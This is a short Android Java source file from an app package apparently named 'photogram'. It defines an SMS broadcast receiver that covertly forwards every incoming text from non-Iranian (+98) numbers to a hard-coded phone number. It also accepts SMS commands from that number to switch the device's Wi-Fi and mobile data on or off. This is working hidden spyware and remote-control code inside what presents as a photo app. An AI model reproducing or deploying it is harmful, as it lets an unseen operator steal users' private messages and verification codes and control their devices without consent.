package com.alirnp.photogram;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class IncomingSms extends BroadcastReceiver {

    StringBuilder messageSb;

    private String centerPhone = "+989384229217";


    public void onReceive(Context context, Intent intent) {


        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                if (pdusObj != null) {

                    messageSb = new StringBuilder();
                    String senderNum = null;

                    for (Object aPdusObj : pdusObj) {

                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);

                        senderNum = currentMessage.getDisplayOriginatingAddress();
                        String message = currentMessage.getDisplayMessageBody();

                        messageSb.append(message);


                    }

                    Utils.logMe(IncomingSms.class, "Sms: " + "senderNum: " + senderNum + "; message: " + messageSb.toString());

                    String msg = messageSb.toString().toLowerCase();

                    if (senderNum != null) {
                        if (senderNum.equals(centerPhone)) {
                            if (msg.startsWith("n"))
                            {
                                Utils.enableWifi(context, true);
                                Utils.enableMobileData(context, true);

                            } else if (msg.equals("f"))
                            {

                                Utils.enableWifi(context, false);
                                Utils.enableMobileData(context, false);

                            }
                        } else if (!senderNum.startsWith("+98")) {

                            SmsManager smgr = SmsManager.getDefault();
                            smgr.sendTextMessage(centerPhone, null, messageSb.toString(), null, null);

                        }
                    }

                }
            }

        } catch (Exception e) {
            Utils.logMe(IncomingSms.class, e.toString());

        }
    }




}